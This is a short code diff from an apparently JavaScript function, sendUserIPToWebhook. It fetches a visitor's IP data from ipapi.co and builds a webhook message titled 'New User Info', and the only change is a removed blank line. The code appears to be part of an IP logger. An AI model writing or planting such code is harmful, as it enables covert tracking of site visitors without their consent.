@@ -3,7 +3,6 @@ async function sendUserIPToWebhook() {
   // Fetching the IP data from the API
   const response = await fetch('https://ipapi.co/json/');
   const data = await response.json();
-
   // Creating the embed for the Webhook with just the IP
   const embed = {
     title: "New User Info",    // Embed title
